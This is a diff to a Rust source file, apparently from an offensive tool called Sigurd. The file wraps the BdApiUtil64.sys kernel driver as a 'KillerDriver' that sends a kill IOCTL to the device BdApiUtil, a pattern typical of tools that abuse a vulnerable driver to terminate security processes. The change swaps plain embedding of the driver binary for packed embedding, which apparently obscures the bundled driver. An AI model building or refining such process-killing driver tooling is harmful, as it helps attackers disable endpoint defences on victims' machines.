@@ -1,4 +1,5 @@
 use std::ptr::null_mut;
+use include_packed::include_packed;
 
 use winapi::{
     ctypes::c_void, 
@@ -21,8 +22,6 @@ const VERSION: &str = "0.0.1";
 
 const DRIVER_DEVICE: &str = "\\\\.\\BdApiUtil";
 const IOCTL_KILL: u32 = 0x800024B4;
-
-static DRIVER: &'static [u8] = include_bytes!("../../../drivers/BdApiUtil64.sys");
 
 pub struct BdApiUtil64 {
     device: *mut c_void
@@ -84,7 +83,7 @@ impl KillerDriver for BdApiUtil64 {
     }
 
     fn get_file(&self) -> Result<Vec<u8>, crate::utils::error::SigurdError> {
-        let v = DRIVER.to_vec();
+        let v = include_packed!("drivers/BdApiUtil64.sys");
         return Ok(v);
     }
 
